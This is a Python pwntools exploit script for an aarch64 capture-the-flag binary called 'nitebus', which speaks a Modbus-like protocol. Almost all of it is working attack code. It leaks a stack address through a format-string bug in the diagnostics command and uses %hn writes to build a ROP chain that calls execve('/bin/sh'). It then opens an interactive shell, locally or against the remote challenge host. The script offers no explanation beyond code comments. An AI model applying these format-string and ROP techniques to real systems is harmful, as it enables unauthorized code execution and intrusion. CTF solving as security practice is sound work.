#!/usr/bin/env python3
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'nitebus')
context.bits = 64
# context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]


gdbscript = '''
set architecture aarch64
init-pwndbg
target remote :5000
dprintf printf, "printf(%p, %p)\\n", $x0, $x1
# b *printf +116
# b *parse_nitebus_packet + 408
b *main+132
c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec() 
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/include/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/include/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        host, port = ("nitebus.chals.nitectf25.live", 1337) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=True)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb-multiarch"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe=exe.removesuffix("_patched"))
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data                             :io.send(data)
sa      = lambda x, y                             :io.sendafter(x, y)
sl      = lambda data                             :io.sendline(data)
sla     = lambda x, y                             :io.sendlineafter(x, y)
se      = lambda data                             :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop=drop)
rl      = lambda drop=True, timeout=None          :io.recvline(drop=drop)
uu32    = lambda num, data=None     : u32((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(4, b"\x00"))
uu64    = lambda num, data=None     : u64((io.recv(num) if not data else io.recvuntil(data)[:num]).ljust(8, b"\x00"))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
#     Arch:       aarch64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No
#     Debuginfo:  Yes

# =========================================================
#                         EXPLOITS
# =========================================================
FC_READ_COILS          = 0x01
FC_READ_HOLDING_REGS   = 0x03
FC_WRITE_SINGLE_REG    = 0x06
FC_DIAGNOSTICS         = 0x08
FC_UPLOAD_CONTROL_PROG = 0x42

SAFE_MAX_UPLOAD = 0x80  # 128 bytes (size of v10[] in upload_control_program)

def nitebus_pkt(slave: int, fc: int, param: int = 0, data: bytes = b"") -> bytes:
    """
    Packet format per src.c:
      [slave:1][fc:1][param:2 LE][data...]
    """
    if isinstance(data, str):
        data = data.encode()
    return p8(slave) + p8(fc) + p16(param) + data

def cmd_diagnostics(msg: bytes, slave: int = 1):
    ru(b"[*] Waiting for nitebus packet...\n")
    s(nitebus_pkt(slave, FC_DIAGNOSTICS, 0, msg))
    ru("[DIAGNOSTICS] ")

def cmd_upload_control_program(program: bytes, slave: int = 1):
    n = len(program)
    ru(b"[*] Waiting for nitebus packet...\n")
    s(nitebus_pkt(slave, FC_UPLOAD_CONTROL_PROG, n, b""))
    ru(b"[*] Enter program data: ")
    s(program)  # send exactly n bytes

def write2bytes(addr: int, value: int):
    value = value - 4 if value > 4 else value + 0xfffc
    cmd_diagnostics(b"AAAA" + f"%{value}c%23$hn".encode().ljust(0x10, b"\x00") + p64(addr))

def write(where, what):
    for i in range(0, 8):
        write2bytes(where + i*2, (what >> (i*16)) & 0xffff)

def exploit(x):
    global io
    io = initialize()
    debug()
    gadget1 = 0x00000000004063c4  # : ldp x6, x8, [sp, #0x18] ; str x0, [x6, #0x20] ; ldp x29, x30, [sp], #0x40 ; mov x0, x8 ; ret
    gadget2 = 0x0000000000445238  # : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret                                                                          
    gadget3 = 0x000000000040ce28  # : ldp x1, x2, [sp, #0x10] ; svc #0
    with log.progress("Leak stack with fmstr"), context.silent:
        cmd_diagnostics(b"%10$p") # leak stack address
        stack_leak = int(rl(),16)
        ret = stack_leak + 0x198
        ret2 = stack_leak + 0x5e8
    with log.progress("Writing ROP chain"), context.silent:
        write(elf.bss(0x100), u64(b"/bin/sh\0"))
        write(ret2 + 0x30, elf.bss(0x80)) # x6 valid address
        write(ret2 + 0x38, 2221) # x8 = 2221 SYS_execve
        write(ret2 + 0x68, elf.bss(0x100)) # x0
        write(ret2 + 0x88, 0)               # x1
        write(ret2 + 0x90, 0)               # x2
    leak("Stack leak", hex(stack_leak))
    leak("Return address", hex(ret))
    leak("Return address 2", hex(ret2))
    with log.progress("Overwriting return address"), context.silent:   
        write(ret2, gadget1)
        write(ret2 + 0x20, gadget2)
        write(ret2 + 0x60, gadget3)
        write2bytes(ret, 0x0b10) # trigger leave ret
    leak("ELF base address", hex(elf.address)) if elf.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except (Exception, KeyboardInterrupt) as e:
            print(f"Iteration {i} Error: {e}")
            sys.stderr.write(traceback.format_exc())
        io.close()